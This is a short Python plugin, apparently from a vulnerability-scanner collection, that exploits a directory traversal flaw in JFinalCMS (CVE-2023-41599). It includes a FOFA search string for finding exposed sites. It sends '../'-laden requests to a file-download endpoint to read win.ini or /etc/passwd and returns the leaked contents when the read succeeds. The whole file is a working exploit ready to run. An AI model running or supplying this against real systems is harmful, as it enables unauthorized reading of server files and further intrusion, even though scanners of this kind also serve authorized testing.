#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/tGSp66--YxSM7C_nTChsww',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'JFinalCMS目录遍历漏洞 CVE-2023-41599',

      'level'     :   'medium',

      'FOFA'      :   'body="content=\"JreCms"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target1 = '/common/down/file?file?fileKey=/../../../../../../../../../Windows/win.ini'
  target2 = '/common/down/file?file?fileKey=/../../../../../../../../../etc/passwd'
  url1 = url + target1
  url2 = url + target2
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['url'] = url2
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret